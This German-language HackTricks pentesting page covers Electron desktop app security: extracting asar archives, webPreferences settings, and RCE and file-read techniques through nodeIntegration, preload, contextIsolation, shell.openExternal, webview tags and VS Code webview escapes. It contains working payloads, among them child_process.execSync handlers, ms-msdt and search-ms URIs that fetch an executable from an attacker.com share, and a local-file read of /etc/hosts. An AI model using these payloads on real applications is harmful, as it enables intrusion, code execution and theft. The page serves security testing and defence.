# Electron-Desktop-Apps

{{#include ../../banners/hacktricks-training.md}}

## Einführung

Electron kombiniert einen privilegierten **Node.js**-Hauptprozess mit **Chromium**-Renderer-Prozessen. Electron ist kein Webbrowser: Anwendungscode kann bewusst Funktionen wie Dateisystem- und Shell-Zugriff verfügbar machen. Daher erfordert das Laden nicht vertrauenswürdiger Inhalte eine strengere Gestaltung der Grenzen als bei einer gewöhnlichen Website.<sup>[[21]](#references)</sup>

Electron-Anwendungen werden häufig in einem `.asar`-Archiv gepackt. Extrahiere es, bevor du den Quellcode überprüfst:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Die `package.json` der Anwendung gibt ihren Haupteinstiegspunkt an. Diese Datei erstellt häufig Renderer-Fenster und legt deren sicherheitsrelevante `webPreferences` fest.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron hat zwei hauptsächliche Prozesstypen:

- Hauptprozess (hat vollständigen Zugriff auf NodeJS)
- Renderer-Prozess (sollte aus Sicherheitsgründen eingeschränkten Zugriff auf NodeJS haben)

![Electron Desktop Apps – Einführung: Renderer-Prozess (sollte aus Sicherheitsgründen eingeschränkten Zugriff auf NodeJS haben)](<../../images/image (182).png>)

Ein **Renderer-Prozess** ist ein Browserfenster, das eine Datei lädt:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Der **main process** konfiguriert jeden renderer process, üblicherweise beim Erstellen eines `BrowserWindow`. Sichere Einstellungen verringern die Wahrscheinlichkeit, dass eine Kompromittierung des Renderers zur Ausführung von nativem Code führt, machen nicht vertrauenswürdige Inhalte jedoch nicht von sich aus sicher.<sup>[[21]](#references)[[22]](#references)</sup>

Überprüfe mindestens die folgenden Renderer-Einstellungen:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** ist standardmäßig `false`. Wenn diese Option aktiviert ist, erhält das JavaScript des Renderers Zugriff auf Node.js-APIs und die Sandbox dieses Renderers wird ebenfalls deaktiviert.
- **`contextIsolation`** ist standardmäßig `true`. Dadurch wird der JavaScript-Kontext der Seite vom Kontext der Preload-Skripte und der Electron-Interna getrennt.
- **`preload`** hat standardmäßig keinen Pfad. Ein konfiguriertes Preload-Skript wird vor den Seitenskripten ausgeführt und kann über `contextBridge` eng begrenzte APIs bereitstellen.
- **`sandbox`** ist seit Electron 20 standardmäßig `true`. Dadurch wird der Zugriff des Renderers auf Betriebssystemressourcen eingeschränkt. Wenn `nodeIntegration: true` gesetzt wird, wird die Sandbox deaktiviert.
- **`nodeIntegrationInWorker`** ist standardmäßig `false` und steuert die Node.js-Integration in Web Workers.
- **`nodeIntegrationInSubFrames`** ist standardmäßig `false`.
  - Wenn **`nodeIntegration`** **aktiviert** ist, können dadurch **Node.js-APIs** in Webseiten verwendet werden, die innerhalb einer Electron-Anwendung in **iframes geladen** werden.
  - Wenn **`nodeIntegration`** **deaktiviert** ist, werden Preloads im iframe geladen.

Konfigurationsbeispiel:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Einige **RCE payloads** von [hier](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Datenverkehr abfangen

Ändere die start-main-Konfiguration und füge die Verwendung eines Proxys hinzu, zum Beispiel:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statisches Tracing der ASAR-zu-Native-Grenze mit REA

**REA** kann ein ASAR-Archiv oder ein extrahiertes Anwendungsverzeichnis einlesen, ohne dessen JavaScript-Bootstrap auszuführen. Der Anwendungsgraph erfasst Paket-Einstiegspunkte, gebündelte Module, `BrowserWindow`- und Preload-Einstellungen, `contextBridge`-Mitglieder, IPC-Registrierungen, Anfragen für native Add-ons und Source-Map-Identitäten. Das bietet einen Ausgangspunkt, um eine für den Renderer freigegebene Fähigkeit bis zu einem privilegierten Handler im Main-Prozess zurückzuverfolgen.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Für einen wörtlichen Feature-String übergib den vollständigen Evidence-Datensatz als `application` und ersetze den Seed durch einen im Ziel beobachteten:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Derselbe `trace_application_feature`-Workflow akzeptiert auch ein beobachtetes Literal — ein API-Member, einen IPC-Kanal oder ein Modul — als Seed. Prüfe den resultierenden Handler-Pfad, mögliche Validierungen und die Übergabe an native Komponenten anhand der zurückgegebenen Quellcodepositionen. Ein Renderer-`invoke` passt nur zu genau einem eindeutigen `ipcMain.handle`-/`handleOnce`-Kandidaten auf demselben exakten literalen Kanal; `send` erfordert entsprechend genau einen eindeutigen `ipcMain.on`-/`once`-/`addListener`-Kandidaten. Dynamische oder doppelte Handler bleiben ungeklärt. Ein angefordertes `.node`-Member ist kein verifizierter nativer Export; passende Hopper-/Ghidra-Evidence muss denselben Artefakt-Digest haben, bevor diese Schlussfolgerung gezogen werden kann. Statische Erreichbarkeit beweist außerdem nicht, dass der Pfad ausgeführt wurde.<sup>[[24]](#references)[[25]](#references)</sup>

Zur Vertrauensgrenze zwischen Renderer und Main-Prozess und zur Handler-Validierung siehe [RCE über Electron contextIsolation via IPC](electron-contextisolation-rce-via-ipc.md).

Zur nativen Nachverfolgung auf Provider-Seite siehe [Reversing-Tools und grundlegende Methoden](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Angriffsfläche von Electron-Auto-Updates

Zu Feed-Integrität, Rollback, Verwechslung signierter Channels und TOCTOU bei Staging-Dateien siehe [Vertrauensgrenzen bei Electron-Auto-Updates](electron-auto-update-trust-boundaries.md).

## Electron Local Code Injection

Bei lokalem Schreib- oder Instrumentierungszugriff auf eine installierte App siehe [Lokale Code-Injection in Electron und Manipulation von Snapshots](electron-local-code-injection-and-snapshot-tampering.md) für ASAR-/Main-Prozess- und V8-Snapshot-Pfade sowie die betriebssystemspezifischen Links.

## RCE: XSS + nodeIntegration

Wenn **nodeIntegration** auf **on** gesetzt ist, kann das JavaScript einer Webseite Node.js-Funktionen einfach durch Aufruf von `require()` verwenden. Zum Beispiel lässt sich die calc-Anwendung unter Windows so ausführen:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Das in dieser Einstellung angegebene Skript **wird vor anderen Skripten im Renderer geladen** und hat daher **uneingeschränkten Zugriff auf Node-APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Daher kann das Skript node-features auf Seiten exportieren:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Wenn `contextIsolation` aktiviert ist, funktioniert das nicht**

## RCE: XSS + contextIsolation

_**contextIsolation**_ führt **getrennte Kontexte für die Skripte der Webseite und den internen JavaScript-Code von Electron** ein, sodass die JavaScript-Ausführung des jeweiligen Codes den anderen nicht beeinflusst. Dies ist eine notwendige Funktion, um die Möglichkeit von RCE auszuschließen.

Wenn die Kontexte nicht isoliert sind, kann ein Angreifer:

1. **Beliebiges JavaScript im Renderer ausführen** (XSS oder Navigation zu externen Websites)
2. **Die integrierte Methode überschreiben**, die im Preload-Code oder im internen Electron-Code verwendet wird, um eine eigene Funktion einzuschleusen
3. **Die Verwendung der überschriebenen Funktion auslösen**
4. RCE?

Es gibt zwei Stellen, an denen integrierte Methoden überschrieben werden können: im Preload-Code oder im internen Electron-Code:

{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Klickereignis umgehen

Wenn beim Klicken auf einen Link Einschränkungen gelten, kannst du sie möglicherweise umgehen, indem du **mit der mittleren Maustaste statt mit der linken Maustaste klickst**.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Weitere Informationen zu diesen Beispielen finden Sie unter [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) und [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Beim Bereitstellen einer Electron-Desktopanwendung ist es entscheidend, die richtigen Einstellungen für `nodeIntegration` und `contextIsolation` zu verwenden. Es steht fest, dass diese Einstellungen **clientseitige Remote Code Execution (RCE)** gegen Preload-Skripte oder den nativen Code von Electron aus dem Main Process effektiv verhindern.

Wenn ein Benutzer mit Links interagiert oder neue Fenster öffnet, werden bestimmte Event-Listener ausgelöst, die für die Sicherheit und Funktionalität der Anwendung entscheidend sind:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Diese Listener werden **von der Desktop-Anwendung überschrieben**, um ihre eigene **Geschäftslogik** zu implementieren. Die Anwendung prüft, ob ein angeklickter Link intern oder in einem externen Webbrowser geöffnet werden soll. Diese Entscheidung wird üblicherweise über eine Funktion namens `openInternally` getroffen. Gibt diese Funktion `false` zurück, bedeutet das, dass der Link extern geöffnet werden soll, und zwar mithilfe der Funktion `shell.openExternal`.

**Hier ist ein vereinfachter Pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Die Best Practices zur Sicherheit von Electron JS raten davon ab, nicht vertrauenswürdige Inhalte mit der Funktion `openExternal` zu öffnen, da dies über verschiedene Protokolle zu RCE führen kann. Betriebssysteme unterstützen verschiedene Protokolle, die möglicherweise RCE auslösen können. Detaillierte Beispiele und weitere Erläuterungen zu diesem Thema findest du in [dieser Quelle](https://positive.security/blog/url-open-rce#windows-10-19042). Sie enthält Beispiele für Windows-Protokolle, mit denen sich diese Schwachstelle ausnutzen lässt.<sup>[[10]](#references)</sup>

Unter macOS lässt sich die Funktion `openExternal` ausnutzen, um beliebige Befehle auszuführen, zum Beispiel mit `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Beispiele für Windows-Protokoll-Exploits:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Diese Schwachstelle findet sich in **[diesem Bericht](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

Das **webviewTag** ist ein **veraltetes Feature**, das die Verwendung von **NodeJS** im **renderer process** ermöglicht. Es sollte deaktiviert werden, da es erlaubt, ein Skript im preload-Kontext zu laden, etwa so:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Daher könnte ein Angreifer, dem es gelingt, eine beliebige Seite zu laden, dieses Tag verwenden, um **ein beliebiges Preload-Skript zu laden**.

Dieses Preload-Skript wurde anschließend ausgenutzt, um einen **verwundbaren IPC-Service (`skype-new-window`) aufzurufen**, der **`shell.openExternal`** aufrief, um RCE zu erreichen:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Interne Dateien lesen: XSS + contextIsolation

**Das Deaktivieren von `contextIsolation` ermöglicht die Verwendung von `<webview>`-Tags**, ähnlich wie bei `<iframe>`, um lokale Dateien zu lesen und zu exfiltrieren. Ein Beispiel zeigt, wie sich diese Schwachstelle ausnutzen lässt, um den Inhalt interner Dateien zu lesen:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Interne Dateien lesen: XSS + contextIsolation: Das Deaktivieren von contextIsolation ermöglicht die Verwendung von Tags , ähnlich wie bei , um...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Außerdem wird eine weitere Methode zum **Lesen einer internen Datei** vorgestellt, die eine kritische Schwachstelle zum Lesen lokaler Dateien in einer Electron-Desktop-App aufzeigt. Dabei wird ein Script eingeschleust, um die Anwendung auszunutzen und Daten zu exfiltrieren:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Old Chromium**

Wenn die mit der Anwendung gebündelte **Chromium**-Version veraltet ist und bekannte Schwachstellen aufweist, kann es möglich sein, diese auszunutzen und XSS in RCE umzuwandeln.<sup>[[20]](#references)</sup>\
Ein Beispiel findest du in diesem **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS-Phishing via Internal-URL-regex-Bypass**

Wenn du XSS findest, aber **kein RCE auslösen oder interne Dateien stehlen kannst**, könntest du trotzdem versuchen, **über Phishing Zugangsdaten zu stehlen**.<sup>[[1]](#references)</sup>

Untersuche zunächst den Frontend-Code, um herauszufinden, was passiert, wenn eine neue URL geöffnet wird:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Der Aufruf von **`openInternally`** entscheidet, ob ein Plattform-Link im **Desktop-Fenster** oder eine Ressource eines Drittanbieters im Systembrowser geöffnet wird.

Lässt sich die URL-Allowlist-Regex der Funktion umgehen – etwa weil Punkte in einem Hostnamen nicht escaped wurden –, könnte ein Angreifer XSS missbrauchen, um auf einer vom Angreifer kontrollierten Infrastruktur eine überzeugende Anmeldeaufforderung zu öffnen:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://`-Protokoll

Wie im [Electron-Sicherheitsleitfaden](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) erwähnt, erhalten Seiten, die unter **`file://`** laufen, weitreichenden Dateizugriff. Daher kann **XSS dazu verwendet werden, beliebige Dateien** vom Rechner des Benutzers zu laden. Ein korrekt entworfenes **benutzerdefiniertes Protokoll** kann den Zugriff auf eine bestimmte Auswahl von Dateien beschränken.<sup>[[21]](#references)</sup>

## Remote-Modul

Das Electron-Remote-Modul ermöglicht **Renderer-Prozessen den Zugriff auf APIs des Main-Prozesses** und erleichtert so die Kommunikation innerhalb einer Electron-Anwendung. Die Aktivierung dieses Moduls birgt jedoch erhebliche Sicherheitsrisiken. Sie vergrößert die Angriffsfläche der Anwendung und macht sie anfälliger für Schwachstellen wie Cross-Site-Scripting-Angriffe (XSS).

> [!TIP]
> Obwohl das **remote**-Modul einige APIs des Main-Prozesses für Renderer-Prozesse verfügbar macht, ist es nicht einfach, allein durch den Missbrauch dieser Komponenten RCE zu erreichen. Die Komponenten können jedoch vertrauliche Informationen preisgeben.

> [!WARNING]
> Viele Apps, die weiterhin das Remote-Modul verwenden, tun dies so, dass **NodeIntegration im Renderer-Prozess aktiviert sein muss**. Das ist ein **erhebliches Sicherheitsrisiko**.

Das integrierte `remote`-Modul von Electron wurde zunächst als veraltet eingestuft und später entfernt. Anwendungen, die weiterhin dessen Modell benötigen, können das separate Paket `@electron/remote` verwenden. Aufgrund der Auswirkungen auf Sicherheit und Leistung sollte vermieden werden, Renderer-Prozessen, denen nicht vertraut wird, Remote-ähnliche Funktionen bereitzustellen.

Bei `@electron/remote` muss das Modul zunächst **im Main-Prozess initialisiert werden**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Der Renderer-Prozess kann dann Objekte aus dem Modul importieren:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Der **[Blogbeitrag](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** weist auf einige interessante **Funktionen** hin, die das Objekt **`app`** aus dem remote-Modul bereitstellt:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Startet** die Anwendung neu, indem die aktuelle Instanz **beendet** und eine neue **gestartet** wird. Nützlich für **App-Updates** oder bedeutende **Statusänderungen**.
- **`app.setAppLogsPath([path])`**  
   - **Legt** ein Verzeichnis zum Speichern von **App-Logs** **fest** oder **erstellt** eines. Die Logs können mit **`app.getPath()`** oder **`app.setPath(pathName, newPath)`** **abgerufen** oder **geändert** werden.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registriert** die aktuelle ausführbare Datei als **Standardhandler** für ein angegebenes **Protokoll**. Bei Bedarf können Sie einen **benutzerdefinierten Pfad** und **Argumente** angeben.
- **`app.setUserTasks(tasks)`**  
   - **Fügt** der **Aufgabenkategorie** in der **Jump List** (unter Windows) Aufgaben hinzu. Jede Aufgabe kann steuern, wie die App **gestartet** wird oder welche **Argumente** übergeben werden.
- **`app.importCertificate(options, callback)`**  
   - **Importiert** ein **PKCS#12-Zertifikat** in den **Zertifikatspeicher** des Systems (nur Linux). Ein **Callback** kann verwendet werden, um das Ergebnis zu verarbeiten.
- **`app.moveToApplicationsFolder([options])`**  
   - **Verschiebt** die Anwendung in den **Applications-Ordner** (unter macOS). Sorgt für eine **Standardinstallation** für Mac-Benutzer.
- **`app.setJumpList(categories)`**  
   - **Legt** eine **benutzerdefinierte Jump List** unter **Windows** **fest** oder **entfernt** sie. Sie können **Kategorien** angeben, um die Darstellung der Aufgaben für den Benutzer zu organisieren.
- **`app.setLoginItemSettings(settings)`**  
   - **Konfiguriert**, welche **ausführbaren Dateien** zusammen mit ihren **Optionen** bei der **Anmeldung** gestartet werden (nur macOS und Windows).
  
Beispiel:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

Die **primäre API** für den Zugriff auf Systemeinstellungen und das **Auslösen von Systemereignissen** in Electron. Methoden wie **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** und **setUserDefault** sind alle **Teil** dieses Moduls.

**Beispielverwendung:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Lauscht** mithilfe von NSDistributedNotificationCenter auf **native macOS-Benachrichtigungen**.  
* Vor **macOS Catalina** konnte man **alle** verteilten Benachrichtigungen abfangen, indem man **nil** an CFNotificationCenterAddObserver übergab.  
* Seit **Catalina / Big Sur** können sandboxed Apps weiterhin **viele Ereignisse** (zum Beispiel **Bildschirmsperren/-entsperrungen**, **Volume-Einbindungen**, **Netzwerkaktivität** usw.) **abonnieren**, indem sie Benachrichtigungen **nach Namen** registrieren.

### **getUserDefault / setUserDefault**

* Stellt eine **Schnittstelle** zu **NSUserDefaults** bereit, wo **Anwendungs-** oder **globale** Einstellungen unter macOS gespeichert werden.
    
* **getUserDefault** kann sensible Informationen abrufen, etwa **zuletzt verwendete Dateispeicherorte** oder den **geografischen Standort des Benutzers**.
    
* **setUserDefault** kann diese Einstellungen **ändern** und dadurch möglicherweise die **Konfiguration** einer App beeinflussen.
    
* In **älteren Electron-Versionen** (vor v8.3.0) war nur die **standardmäßige Suite** von NSUserDefaults **zugänglich**.

## Shell.showItemInFolder

Diese Funktion zeigt die angegebene Datei in einem Dateimanager an. Auf betroffenen Plattformen und Versionen konnte diese Interaktion **die Datei automatisch ausführen**.

Weitere Informationen finden Sie unter [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron-Apps sollten über eine **Content Security Policy (CSP)** verfügen, um **XSS-Angriffe zu verhindern**. Die **CSP** ist ein **Sicherheitsstandard**, der dabei hilft, die **Ausführung** von **nicht vertrauenswürdigem Code** im Browser zu **verhindern**.

Sie wird üblicherweise in der Datei **`main.js`** oder im Template **`index.html`** mit der CSP in einem **meta-Tag** **konfiguriert**.

Weitere Informationen finden Sie unter:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview-CSP + postMessage-Vertrauen + Laden lokaler Dateien (VS Code 1.63)

Diese reale Angriffskette betraf Visual Studio Code 1.63 (CVE-2021-43908) und zeigt, wie eine einzelne durch Markdown ausgelöste XSS in einer Webview zu vollständiger RCE eskaliert werden kann, wenn CSP, postMessage und Scheme-Handler falsch konfiguriert sind. Öffentliche PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Übersicht über die Angriffskette
- Erste XSS über die Webview-CSP: Die generierte CSP enthielt `style-src 'self' 'unsafe-inline'`, wodurch eine Inline-/Style-basierte Injection in einem `vscode-webview://`-Kontext möglich war. Der Payload sendete einen Beacon an `/stealID`, um die extensionId der Ziel-Webview zu exfiltrieren.
- Erstellen der Ziel-Webview-URL: Die geleakte ID wurde verwendet, um `vscode-webview://<extensionId>/.../<publicUrl>` zu erstellen.
- Zweite XSS durch postMessage-Vertrauen: Die äußere Webview vertraute `window.postMessage` ohne strenge Prüfungen von Origin und Typ und lud HTML eines Angreifers mit `allowScripts: true`.
- Laden lokaler Dateien durch Scheme-/Pfad-Umschreibung: Der Payload schrieb `file:///...` in `vscode-file://vscode-app/...` um und ersetzte `exploit.md` durch `RCE.html`. Dabei wurde eine schwache Pfadvalidierung ausgenutzt, um eine privilegierte lokale Ressource zu laden.
- RCE in einem Node-fähigen Kontext: Das geladene HTML wurde mit verfügbaren Node-APIs ausgeführt und ermöglichte so die Ausführung von Betriebssystembefehlen.

Beispiel für eine RCE-Grundfunktion im finalen Kontext
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Weiterführende Lektüre zu Vertrauensproblemen bei postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: synthetische Webview-Tastenkombinationen + deklarative Extension-Command-Bridges

Im Juni 2026 trat eine andere Klasse von VS Code-Webview-Escapes auf: **Nicht vertrauenswürdiges JavaScript in einer Notebook-/Preview-Webview konnte privilegierte globale Tastenkombinationen synthetisieren**, weil der Webview-Preload `keydown`-Daten an den Host-Workbench weiterleitete und der Host sie als echte Benutzereingabe behandelte.<sup>[[14]](#references)</sup>

Dies ist Teil einer längeren Geschichte von Angriffen auf Vertrauensgrenzen in IDEs, bei denen projektgesteuerte Inhalte privilegierte Editorfunktionen erreichen.<sup>[[19]](#references)</sup>

### Fehler an der Vertrauensgrenze

Wenn eine Cross-Origin-/Sandbox-Webview vom Angreifer kontrollierte Tastaturfelder (`key`, `code`, `keyCode`, Modifikatoren, `repeat`) ohne Prüfung von `event.isTrusted` in eine privilegierte `postMessage`-/Message-Port-Bridge kopiert, kann JavaScript in der Webview Workbench-Tastenkombinationen ausführen mit:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Das ist besonders nützlich, wenn **synthetische Eingabe vom Browser blockiert wird**. Skriptgesteuerte Tastenereignisse können normalerweise **keinen beliebigen Text in HTML-`<input>`-Elemente eingeben**, lösen aber weiterhin Tastenkombinationen aus, die `keydown` direkt verarbeiten.

### Praktische Missbrauchsmuster

- **Missbrauch von UI-Tastenkombinationen:** Ziele globale Tastenkombinationen wie das Bestätigen von Benachrichtigungen, die Navigation in Paletten, das Aktivieren fokussierter Schaltflächen oder die Menünavigation, statt zu versuchen, Befehle einzugeben.
- **Vorhersehbare privilegierte Aufforderungen anhand von Workspace-Metadaten:** Ein vom Repository kontrolliertes `.vscode/extensions.json` kann eine Angreifer-Extension empfehlen und eine vorhersehbare Installationsbenachrichtigung erzeugen, die mit einer Tastenkombination wie `Ctrl+Shift+A` bestätigt werden kann.
- **Deklaratives Extension-Manifest als Befehlsbrücke:** Selbst wenn der Code lokaler Workspace-Extensions durch CSP in VS Code im Web blockiert wird, können deklarative `package.json`-Beiträge weiterhin geladen werden. Eine lokale Extension unter `.vscode/extensions` kann eine Tastenbelegung registrieren, die `runCommands` und anschließend einen privilegierten internen Befehl wie `workbench.extensions.installExtension` aufruft.<sup>[[14]](#references)[[18]](#references)</sup>

Beispiel für ein Manifestmuster:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Versteckte Sicherheitsflags, die über nicht vertrauenswürdige Metadaten erreichbar sind:** Wenn der interne Befehl vom Angreifer kontrollierte Argumente wie `{"context":{"skipPublisherTrust":true}}` akzeptiert, können deklarative Metadaten einen Vertrauensdialog unterdrücken und eine im Marketplace/CDN gehostete Erweiterung installieren, die schließlich Angreifercode ausführt.
- **Missbrauch vertrauenswürdiger Workspaces:** Wenn Remote-/Web-Workspaces automatisch als vertrauenswürdig eingestuft werden, werden lokale Workspace-Erweiterungen zu einer wertvollen Brücke von Repository-Inhalten zu privilegierten Aktionen des Editors.
- **Ausweitung des Umfangs nach einer Kompromittierung:** Untersuche nach der Ausführung der Erweiterung, welche Tokens der Editor Erweiterungen zugänglich macht. In `github.dev` war das gestohlene GitHub-Token nicht auf das geöffnete Repository beschränkt. Eine Abfrage von `https://api.github.com/user/repos` listete daher weitere zugängliche private Repositories auf.

### Audit-Hinweise

- Betrachte die **Weiterleitung von Eingaben aus Webviews an den Host** als Privilegiengrenze. Leite niemals synthetische Tastatur- oder Klickereignisse aus nicht vertrauenswürdigen Frames an den Host weiter.
- Erzwinge die Autorisierung **innerhalb** sensibler Befehle. Akzeptiere keinen vom Aufrufer bereitgestellten Befehlskontext, der interne Flags wie `skipPublisherTrust` setzen kann.
- Gehe nicht davon aus, dass das Blockieren ausführbaren lokalen Erweiterungscodes ausreicht. Überprüfe auch **deklarative Beiträge** (`keybindings`, `menus`, `commands`, tasks) in manifests, die vom Workspace kontrolliert werden.
- Die Fixes vom 3. Juni 2026 fügten `isTrusted` zu weitergeleiteten Ereignissen hinzu, deaktivierten die Weiterleitung nicht vertrauenswürdiger Tastatureingaben in Notebook-Webviews und akzeptierten keinen vom Aufrufer bereitgestellten Kontext für Installationsbefehle mehr.<sup>[[16]](#references)[[17]](#references)</sup>

## **Tools**

